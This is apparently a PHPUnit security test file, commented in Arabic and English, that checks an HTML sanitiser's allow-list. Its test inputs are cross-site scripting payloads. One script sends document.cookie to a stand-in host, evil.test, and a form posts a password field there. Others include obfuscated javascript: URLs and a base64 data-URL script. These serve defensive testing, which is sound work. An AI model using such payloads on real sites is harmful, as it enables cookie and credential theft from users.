<?php

declare(strict_types=1);

namespace Tests\Security;

use App\Support\HtmlSanitizer;
use PHPUnit\Framework\TestCase;

/**
 * تنقية محتوى المنصة | Platform content sanitisation (§10, §16).
 *
 * ═══════════════════════════════════════════════════════════════════════════
 * محتوى المقالات والصفحات الثابتة يُعرض دون هروب ليظهر بتنسيقه، وهذا مسار
 * حقن مباشر لو تُرك بلا تنقية. المنهج **قائمة سماح**: كل وسم وسمة غير
 * مذكورين صراحةً يُزالان.
 *
 * سياسة أمن المحتوى تحجب السكربت السطري أيضاً، لكن الاعتماد على طبقة واحدة
 * خطأ — ترويسة واحدة تسقط في إعداد خادم خاطئ فيسقط الحاجز كله.
 * ═══════════════════════════════════════════════════════════════════════════
 */
final class HtmlSanitizerTest extends TestCase
{
    // ═══════════════════ ما يُحذف | What is removed ═══════════════════

    /** السكربت يُحذف بمحتواه | A script tag is removed with its contents. */
    public function test_script_tags_are_removed_entirely(): void
    {
        $clean = HtmlSanitizer::clean(
            '<p>نصّ سليم</p><script>document.location="https://evil.test/"+document.cookie</script>',
        );

        $this->assertStringContainsString('نصّ سليم', $clean);
        $this->assertStringNotContainsString('script', strtolower($clean));
        $this->assertStringNotContainsString('document.cookie', $clean);
    }

    /** معالجات الأحداث تُزال | Event handler attributes are stripped. */
    public function test_event_handlers_are_stripped(): void
    {
        $clean = HtmlSanitizer::clean('<p onclick="steal()" onmouseover="x()">نصّ</p>');

        $this->assertStringNotContainsString('onclick', strtolower($clean));
        $this->assertStringNotContainsString('onmouseover', strtolower($clean));
        $this->assertStringContainsString('نصّ', $clean);
    }

    /** روابط جافاسكربت تُزال | javascript: URLs are stripped. */
    public function test_javascript_urls_are_stripped(): void
    {
        $clean = HtmlSanitizer::clean('<a href="javascript:alert(1)">اضغط</a>');

        $this->assertStringNotContainsString('javascript', strtolower($clean));
        $this->assertStringContainsString('اضغط', $clean);
    }

    /** المحارف الضابطة لا تُخفي المخطّط | Control characters cannot hide the scheme. */
    public function test_obfuscated_javascript_urls_are_stripped(): void
    {
        foreach ([
            "<a href=\"java\tscript:alert(1)\">x</a>",
            "<a href=\"  JaVaScRiPt:alert(1)\">x</a>",
            "<a href=\"java\nscript:alert(1)\">x</a>",
        ] as $payload) {
            $clean = HtmlSanitizer::clean($payload);
            $this->assertStringNotContainsString('alert', $clean, "لم يُنقَّ: {$payload}");
        }
    }

    /** روابط data تُزال | data: URLs are stripped. */
    public function test_data_urls_are_stripped(): void
    {
        $clean = HtmlSanitizer::clean(
            '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
        );

        $this->assertStringNotContainsString('data:', $clean);
    }

    /** الإطارات والكائنات تُحذف | Frames and objects are removed. */
    public function test_frames_and_objects_are_removed(): void
    {
        $clean = HtmlSanitizer::clean(
            '<iframe src="https://evil.test"></iframe>'
            . '<object data="x.swf"></object>'
            . '<embed src="x.swf">'
            . '<p>باقٍ</p>',
        );

        foreach (['iframe', 'object', 'embed'] as $tag) {
            $this->assertStringNotContainsString($tag, strtolower($clean));
        }

        $this->assertStringContainsString('باقٍ', $clean);
    }

    /** النماذج تُحذف | Forms are removed — they redirect user input off-platform. */
    public function test_forms_are_removed(): void
    {
        $clean = HtmlSanitizer::clean(
            '<form action="https://evil.test"><input name="password"></form><p>نصّ</p>',
        );

        $this->assertStringNotContainsString('<form', strtolower($clean));
        $this->assertStringNotContainsString('<input', strtolower($clean));
        $this->assertStringContainsString('نصّ', $clean);
    }

    /** أنماط CSS تُحذف | Style blocks and attributes are removed. */
    public function test_styles_are_removed(): void
    {
        $clean = HtmlSanitizer::clean(
            '<style>body{display:none}</style><p style="position:fixed;inset:0">نصّ</p>',
        );

        $this->assertStringNotContainsString('<style', strtolower($clean));
        $this->assertStringNotContainsString('position:fixed', $clean);
        $this->assertStringContainsString('نصّ', $clean);
    }

    /** التعليقات تُحذف | Comments are removed. */
    public function test_comments_are_removed(): void
    {
        $clean = HtmlSanitizer::clean('<p>نصّ</p><!-- سرّ داخلي -->');

        $this->assertStringNotContainsString('سرّ داخلي', $clean);
        $this->assertStringNotContainsString('<!--', $clean);
    }

    // ═══════════════════ ما يبقى | What survives ═══════════════════

    /** التنسيق المشروع يبقى كما هو | Legitimate formatting survives intact. */
    public function test_legitimate_formatting_survives(): void
    {
        $html = '<h2>عنوان</h2>'
              . '<p>فقرة فيها <strong>تأكيد</strong> و<em>إمالة</em>.</p>'
              . '<ul><li>بند أول</li><li>بند ثانٍ</li></ul>'
              . '<blockquote>اقتباس</blockquote>';

        $clean = HtmlSanitizer::clean($html);

        foreach (['<h2>', '<strong>', '<em>', '<ul>', '<li>', '<blockquote>'] as $tag) {
            $this->assertStringContainsString($tag, $clean);
        }

        $this->assertStringContainsString('بند ثانٍ', $clean);
    }

    /** الروابط الآمنة تبقى | Safe links survive. */
    public function test_safe_links_survive(): void
    {
        $clean = HtmlSanitizer::clean(
            '<p><a href="https://example.test/guide" title="دليل">رابط</a>'
            . ' و<a href="/knowledge">داخلي</a>'
            . ' و<a href="mailto:info@example.test">بريد</a></p>',
        );

        $this->assertStringContainsString('https://example.test/guide', $clean);
        $this->assertStringContainsString('href="/knowledge"', $clean);
        $this->assertStringContainsString('mailto:info@example.test', $clean);
    }

    /** الرابط في تبويب جديد يحمل rel المانع | target links gain a protective rel. */
    public function test_target_links_gain_noopener(): void
    {
        $clean = HtmlSanitizer::clean('<a href="https://example.test" target="_blank">خارجي</a>');

        $this->assertStringContainsString('noopener', $clean);
        $this->assertStringContainsString('noreferrer', $clean);
    }

    /** الجداول تبقى | Tables survive. */
    public function test_tables_survive(): void
    {
        $clean = HtmlSanitizer::clean(
            '<table><thead><tr><th>عمود</th></tr></thead><tbody><tr><td>قيمة</td></tr></tbody></table>',
        );

        $this->assertStringContainsString('<table>', $clean);
        $this->assertStringContainsString('<th>عمود</th>', $clean);
        $this->assertStringContainsString('<td>قيمة</td>', $clean);
    }

    /** العربية لا تُشوَّه | Arabic text is not mangled. */
    public function test_arabic_text_is_preserved_exactly(): void
    {
        $text  = 'المشروعات الصغيرة والمتوسطة — تمويل «ميسّر» بنسبة ١٢٪ وربّما أكثر.';
        $clean = HtmlSanitizer::clean('<p>' . $text . '</p>');

        $this->assertStringContainsString($text, $clean);
    }

    /** الوسم غير المسموح يترك محتواه | A disallowed formatting tag leaves its text. */
    public function test_an_unknown_tag_is_unwrapped_not_dropped(): void
    {
        $clean = HtmlSanitizer::clean('<p>قبل <marquee>نصّ مهمّ</marquee> بعد</p>');

        $this->assertStringNotContainsString('marquee', strtolower($clean));
        $this->assertStringContainsString('نصّ مهمّ', $clean);
        $this->assertStringContainsString('قبل', $clean);
        $this->assertStringContainsString('بعد', $clean);
    }

    /** النصّ الفارغ يعود فارغاً | Empty input returns empty. */
    public function test_empty_input_returns_empty(): void
    {
        $this->assertSame('', HtmlSanitizer::clean(''));
        $this->assertSame('', HtmlSanitizer::clean('   '));
    }

    /** النصّ العادي بلا وسوم يبقى | Plain text passes through. */
    public function test_plain_text_passes_through(): void
    {
        $this->assertStringContainsString('نصّ بلا وسوم', HtmlSanitizer::clean('نصّ بلا وسوم'));
    }

    /** التنقية مستقرّة | Sanitising twice changes nothing further. */
    public function test_sanitising_is_idempotent(): void
    {
        $html  = '<p>فقرة <strong>مؤكَّدة</strong> و<a href="https://example.test">رابط</a></p>';
        $once  = HtmlSanitizer::clean($html);
        $twice = HtmlSanitizer::clean($once);

        $this->assertSame($once, $twice);
    }

    /** الوسم المتداخل الخبيث لا ينجو بالتفاف | Nested payloads do not survive unwrapping. */
    public function test_nested_payloads_do_not_survive(): void
    {
        $clean = HtmlSanitizer::clean(
            '<div><span><marquee><script>alert(1)</script></marquee></span></div>',
        );

        $this->assertStringNotContainsString('alert', $clean);
        $this->assertStringNotContainsString('script', strtolower($clean));
    }
}
